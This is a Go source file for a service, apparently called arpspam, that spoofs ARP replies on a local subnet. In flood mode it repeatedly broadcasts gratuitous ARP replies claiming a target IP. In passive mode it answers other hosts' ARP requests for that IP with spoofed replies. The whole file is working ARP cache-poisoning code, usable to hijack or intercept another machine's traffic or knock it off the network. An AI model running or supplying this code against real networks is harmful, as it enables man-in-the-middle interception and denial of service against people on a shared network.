package service

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/marccth/arpspam/internal/arp"
)

func (s *Service) Run() error {
	// Validate the provided IP address and interface name
	spoofIP := net.ParseIP(s.Target).To4()
	if spoofIP == nil {
		fmt.Println("\nPlease provide a valid IP address")
		return nil
	}
	iface, err := net.InterfaceByName(s.Iface)
	if err != nil {
		return err
	}

	// Get the interface's network
	localNet, err := getInterfaceNetwork(iface)
	if err != nil {
		return err
	}
	log.Printf("Using network %v for interface %v", localNet, iface.Name)

	// Verify that the target IP is within the range of this interface
	if !localNet.Contains(spoofIP) {
		return fmt.Errorf("Target IP %v is not in the same subnet as interface %v: %v", spoofIP, iface.Name, localNet)
	}

	switch s.Mode {
	case Flood_Mode:
		return s.floodWorker(iface, spoofIP)
	case Passive_Mode:
		return s.passiveWorker(iface, spoofIP)
	default:
		return fmt.Errorf("Invalid mode %v", s.Mode)
	}
}

func (s *Service) floodWorker(iface *net.Interface, spoofIP net.IP) error {
	handle, err := pcap.OpenLive(iface.Name, 65536, true, pcap.BlockForever)
	if err != nil {
		return err
	}
	defer handle.Close()

	// Run gratiuitious ARP indefinitely
	var (
		broadcastMAC     = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
		intervalDuration = time.Duration(s.ARPInterval) * time.Second
	)
	for {
		log.Printf("Emitting %d ARP replies with source IP %v and source MAC %v\n", s.ARPCount, spoofIP, iface.HardwareAddr)
		if err := arp.WriteARPReplies(handle, iface, spoofIP, broadcastMAC, spoofIP, s.ARPCount); err != nil {
			log.Printf("error writing packets on %v: %v", iface.Name, err)
			return err
		}
		log.Printf("Successfully emitted ARP replies and will re-emit in %d seconds\n", s.ARPInterval)
		time.Sleep(intervalDuration)
	}
}

func (s *Service) passiveWorker(iface *net.Interface, spoofIP net.IP) error {
	handle, err := pcap.OpenLive(iface.Name, 65536, true, pcap.BlockForever)
	if err != nil {
		return err
	}
	defer handle.Close()

	// Read incoming packets indefinitely
	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	incomingPackets := src.Packets()
	for packet := range incomingPackets {
		// If not an ARP packet, ignore it
		arpLayer := packet.Layer(layers.LayerTypeARP)
		if arpLayer == nil {
			continue
		}

		// If not an ARP Request, or it comes from our own MAC, ignore it
		arpType := arpLayer.(*layers.ARP)
		if arpType.Operation != layers.ARPRequest || bytes.Equal([]byte(iface.HardwareAddr), arpType.SourceHwAddress) {
			continue
		}

		var (
			requestDstIP = net.IP(arpType.DstProtAddress)
			requestSrcIP = net.IP(arpType.SourceProtAddress)
		)

		// If the requested address does not match the IP we are spoofing, ignore it
		if !(bytes.Equal(spoofIP, requestDstIP)) {
			continue
		}

		log.Printf("IP %v is requesting MAC for %v", requestSrcIP, requestDstIP)

		err := arp.WriteARPReplies(handle, iface, spoofIP, arpType.SourceHwAddress, requestSrcIP, s.ARPCount)
		if err != nil {
			return err
		}

		log.Printf("Sent spoofed ARP Reply to %v", requestSrcIP)
	}

	return nil
}

// getInterface takes a network interface and returns any associated IPv4 address and mask
func getInterfaceNetwork(iface *net.Interface) (*net.IPNet, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}

	// Find first IPv4 address on this interface
	var localNet *net.IPNet
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok {
			if ip4 := ipnet.IP.To4(); ip4 != nil {
				localNet = &net.IPNet{
					IP:   ip4,
					Mask: ipnet.Mask,
				}
				break
			}
		}
	}

	// Check that the address is suitable
	if localNet == nil {
		return nil, fmt.Errorf("no good IP network found")
	}
	if localNet.IP[0] == 127 {
		return nil, fmt.Errorf("skipping localhost")
	}
	if localNet.Mask[0] != 0xff || localNet.Mask[1] != 0xff {
		return nil, fmt.Errorf("mask means network is too large")
	}

	return localNet, nil
}
